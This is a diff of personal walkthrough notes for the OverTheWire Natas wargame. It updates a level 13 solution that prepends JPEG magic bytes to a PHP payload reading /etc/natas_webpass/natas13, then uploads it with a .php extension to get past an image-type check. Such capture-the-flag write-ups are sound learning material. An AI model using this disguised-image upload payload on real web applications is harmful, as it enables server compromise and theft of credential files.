@@ -23,7 +23,7 @@ ctrl + U
 ->
 http://natas2.natas.labs.overthewire.org/
 ->
-<img src="files/pixel.png">
+<img src="files/pixel.jpeg">
 ->
 http://natas2.natas.labs.overthewire.org/files
 ->
@@ -247,7 +247,7 @@ Background color: #ffffff
 ->
 open the source code
 understand the code flow well
-please review the natas11.png before continuing
+please review the natas11.jpeg before continuing
 ->
 now that we understand the code/encryption flow well
 we now know what we have to do to reverse the encryption.
@@ -444,18 +444,30 @@ aha.test: PHP script, ASCII text
 00000030: 2f6e 6174 6173 3133 2229 3b20 3f3e 0a    /natas13"); ?>.
 
 
-now i could use a hex editor which is the most easy way but i dont want to install it on my kali so ill use python instead.
 
-> python -c 'with open("aha.test", "wb") as file: file.write(bytes.fromhex("89504E47") + "<?php echo file_get_contents(\"/etc/natas_webpass/natas13)\"); ?>".encode())'                                                                                                                                                       
+now i could use a hex editor which is the most easy way but i dont want to install it on my kali so ill use python instead.
+as can be seen in the next snippet we have new 4 characters at the start of the hex dump of the aha.test payload file.
+i used the wiki page of JPEG to find the hex magic bytes
+
+
+> python -c 'with open("aha.test", "wb") as file: file.write(bytes.fromhex("FFD8FFE0") + "<?php echo file_get_contents(\"/etc/natas_webpass/natas13)\"); ?>".encode())'                                                                                                                                                       
 
 > xxd aha.test
-00000000: 8950 4e47 3c3f 7068 7020 6563 686f 2066  .PNG<?php echo f
+xxd aha.test
+00000000: ffd8 ffe0 3c3f 7068 7020 6563 686f 2066  ....<?php echo f
 00000010: 696c 655f 6765 745f 636f 6e74 656e 7473  ile_get_contents
 00000020: 2822 2f65 7463 2f6e 6174 6173 5f77 6562  ("/etc/natas_web
 00000030: 7061 7373 2f6e 6174 6173 3133 2922 293b  pass/natas13)");
-00000040: 203f 3e                                   ?>
+00000040: 203f 3e                                 ?>
                    
 
+NOTE: i used PNG magic bytes but i had an error:
+exif_imagetype(): PNG file corrupted by ASCII 
+which is explained here why it happens but its easier to switch to JPEG magic bytes
+https://stackoverflow.com/questions/26712824/is-it-possible-to-fix-png-files-corrupted-by-ascii-conversion
+
+
+now upload the file again, change the filename post parameter to have extention of php again and viola
 
 
 lvl 15:
